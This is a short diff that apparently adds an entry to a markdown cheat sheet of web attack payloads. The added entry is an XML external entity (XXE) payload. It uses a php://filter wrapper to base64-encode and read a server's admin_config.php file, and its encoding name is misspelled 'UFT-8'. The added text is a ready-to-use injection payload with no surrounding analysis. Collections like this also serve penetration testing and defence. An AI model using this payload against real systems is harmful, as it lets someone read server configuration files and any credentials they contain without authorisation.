@@ -471,6 +471,17 @@ More examples
 	<table_num>2</table_num>
 	<food>&test;</food>
 </root>
+
+More examples 
+
+<?xml  version="1.0" encoding="UFT-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/admin_config.php"> ]>
+		<admin>
+		<head>test</head>
+		<template>&xxe;</template>
+		<body>test</body>
+		<description>test</description>
+		</admin>
 ```
 
 ### xss via file upload
